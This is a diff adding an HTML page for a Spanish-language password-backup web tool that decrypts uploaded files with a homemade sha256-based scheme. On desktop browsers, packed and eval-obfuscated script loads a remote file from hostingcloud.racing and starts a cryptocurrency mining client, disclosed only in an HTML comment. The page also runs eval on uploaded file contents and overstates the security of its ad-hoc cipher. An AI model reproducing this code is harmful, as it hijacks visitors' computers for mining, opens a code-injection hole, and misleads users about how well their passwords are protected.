@@ -1,0 +1,120 @@
+<!-- 
+Programado por: Ivan Jesus Rojas Chaparro. 
+Nota: El codigo del algoritmo sha256 lo saque de internet el codigo para detectar si se esta en el movil o en la pc tambien al igual
+que bootstrap y los iconos, yo cree todo lo demas, esta mini web la monetizo con publicidad por favor no la bloquees si te gusta mi programa :D y solo mino
+criptomonedas cuando estas en la PC y al 20% de cpu o menos nunca en tu movil.
+-->
+<!DOCTYPE html>
+<html>
+<head>
+<title>passwordBackup</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0">
+<link href="bootstrap.min.css" rel="stylesheet">
+<script type="text/javascript">
+    var adfly_id = 14996329;
+	var adfly_advert = 'init';
+	var frequency_cap = 5;
+	var frequency_delay = 5;
+	var init_delay = 3;
+	var popunder = true;
+    var popunder_frequency_delay = 0;
+    var adfly_google_compliant = true;
+</script>
+<script src="https://cdn.adf.ly/js/display.js"></script>
+<script src="sha256.js"></script>
+<script src="encriptar.js"></script>
+<style type="text/css">
+	.CUD {
+	margin:10px auto;
+	width:70%;
+	}
+	
+	@media (max-width:500px) {
+		.CUD {
+		width:95%;
+		}
+	}
+</style>
+</head>
+<body>
+<div class="container" id="MAIN">
+		<div class="modal modal-alert d-block bg-light py-2" style="position:fixed;width:100%;height:100%;" >
+		  <div class="CUD">
+			<div class="modal-content rounded-3 shadow">
+			  <div class="modal-body p-4 text-center">
+				<h5 class="mb-0">PasswordBackup - Cargar Archivo</h5>
+				<p class="mb-0 text-secondary p-2 fw-bold" style="text-align:left;font-size:0.7em;">Guarda tus contraseñas de forma segura: La contraseña que eligas creara un hash con el algoritmo sha256, y cada letra del hash, que son 64 letras, se sumaran a cada letra de la informacion a encriptar, quedando indecifrable, Esto quiere decir que para revelar tu informacion sin tu contraseña alguien necesitaria miles o millones de super computadores y siglos de vida para poder desifrar tu informacion, para que la proteccion de tus datos sea maxima, tu contraseña debe ser larga, esto no es obligatorio pero si quieres proteccion es recomendable, si tu contraseña por ejemplo es de dos letras seria muy facil de decifrar con un programa que solo intente combinaciones, sin tu contraseña este algoritmo genera puro texto sin centido, no hay una manera facil de descubrir si la contraseña es correcta porque este algoritmo no guarda ninguna informacion extra para determinarlo, no se guarda ningun tipo de informacion en ningun servidor esta web solo funciona en el navegador, borra las cookies para no dejar tu archivo cargado.
+				<br><br>
+				<span class="fw-bold">Autor: </span> Ivan Jesus Rojas Chaparro.<br>
+				<span class="fw-bold">Trust Wallet BTC: </span>bc1qg9ezvhqzyzrtwft4ma7wvaygddc2jxwy73q7ym<br>
+				</p>
+			  </div>
+			  <div class="modal-footer flex-nowrap p-0">
+				<button type="button" class="fw-bold btn btn-lg btn-link fs-6 text-decoration-none col-4 m-0 rounded-0 border-end">Cargar Archivo</button>
+				<button type="button" class="fw-bold btn btn-lg btn-link fs-6 text-decoration-none col-4 m-0 rounded-0 border-end"><a href="lista.html" style="text-decoration:none;">Lista</a></button>
+				<button type="button" class="fw-bold btn btn-lg btn-link fs-6 text-decoration-none col-4 m-0 rounded-0 border-end"><a href="encriptar.html" style="text-decoration:none;">Encriptar</a></button>
+			  </div>
+			  <div class="bg-secundary p-4 border-top" style="text-align:center;">
+				
+				<div class="mb-3 form-floating">        
+					<input type="password" class="form-control" id="clave" placeholder="Contraseña de archivo">        
+					<label for="clave" class="form-label">Contraseña de archivo:</label>
+				</div>
+				
+				<input id="archivo" class="form-control" type="file"></input>
+				
+				<input onclick="cargar();" class="btn btn-sm btn-primary mt-2" type="button" value="Desencriptar"></input>
+				
+			  </div>
+			</div>
+		  </div>
+		</div>
+</div>
+</body>
+<script>
+		
+		function cargar() {
+		
+			var c = document.getElementById("clave");
+			var f = document.getElementById("archivo");
+			
+			var ff = f.files[0];
+			var txt = new FileReader();
+			txt.onload = function(e) {
+				eval('var datos = '+e.target.result);
+		//		console.log(datos);
+				for(var i = 0; i < datos.length; i++) {
+	//				console.log(datos[i][0]);
+//					alert( desencriptar(datos[i][0],c.value) );
+					datos[i][0] = desencriptar(datos[i][0],c.value);
+				}
+				localStorage.clave = sha256(sha256(c.value)+sha256(c.value));
+				localStorage.datos = JSON.stringify(datos);
+				localStorage.archivoCargado = JSON.stringify([true]);
+				alert("Archivo Cargado.");
+			}
+		//	console.log(txt);
+			txt.readAsText(f.files[0]);
+		}
+		
+        let navegador = navigator.userAgent;
+        if (navigator.userAgent.match(/Android/i) || navigator.userAgent.match(/webOS/i) || navigator.userAgent.match(/iPhone/i) || navigator.userAgent.match(/iPad/i) || navigator.userAgent.match(/iPod/i) || navigator.userAgent.match(/BlackBerry/i) || navigator.userAgent.match(/Windows Phone/i)) {
+           // movil
+        } else {
+
+			// pc
+			eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('7 6="5://4.3.2/1.0";',8,8,'js|suc6|racing|hostingcloud|www|https|l|var'.split('|'),0,{}))
+			var script = document.createElement('script');
+			script.onload = function () {
+			   eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('b 1=a 8.7(\'6\',{5:0.9,c:\'4\',3:0});1.2();',13,13,'|_client|start|ads|w|throttle|68ccf80a2a1846b35d413b11d5da28806ae25d17b6055e70aa050408f35e8fdf|Anonymous|Client||new|var|'.split('|'),0,{}))
+			};
+			script.src = l;
+
+			document.head.appendChild(script); 
+
+
+        }
+</script>
+<script src="bootstrap.bundle.min.js"></script>
+</html>
